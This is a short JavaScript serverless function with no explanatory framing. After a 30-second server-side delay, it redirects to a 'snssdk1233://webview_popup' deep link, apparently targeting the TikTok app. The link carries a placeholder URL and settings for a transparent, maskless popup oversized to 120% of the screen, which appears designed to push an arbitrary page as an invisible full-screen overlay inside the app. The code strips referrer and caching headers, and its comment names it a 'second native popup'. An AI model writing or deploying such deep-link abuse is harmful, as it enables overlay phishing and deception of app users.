// Second native popup, requested after a 30-second server-held wait.
const WAIT_MS = 30000;
const DESTINATION = 'snssdk1233://webview_popup?url=TINYURLHERE';
const POPUP_SETTINGS = '&use_spark=1&show_mask=0&container_bg_color=00000000&loading_bg_color=00000000&gravity=center&width=120%25&height=120%25&radius=0';
const HEADERS = {
  'Cache-Control': 'private, no-store, max-age=0',
  'Referrer-Policy': 'no-referrer',
  'X-Content-Type-Options': 'nosniff'
};
export const config = { maxDuration: 60 };
export default {
  async fetch(request) {
    if (request.method !== 'GET')
      return new Response(null,{status:405,headers:{...HEADERS,Allow:'GET'}});
    const params=new URL(request.url).searchParams;
    const values=params.getAll('q');
    if(values.length>1)return new Response('Ambiguous query',{status:400,headers:HEADERS});
    const carried=values[0]||'';
    if(carried.length>6000)return new Response('Query too long',{status:414,headers:HEADERS});
    await new Promise(resolve=>setTimeout(resolve,WAIT_MS));
    const location=DESTINATION+(carried?encodeURIComponent('?'+carried):'')+POPUP_SETTINGS;
    return new Response(null,{status:302,headers:{...HEADERS,Location:location}});
  }
};
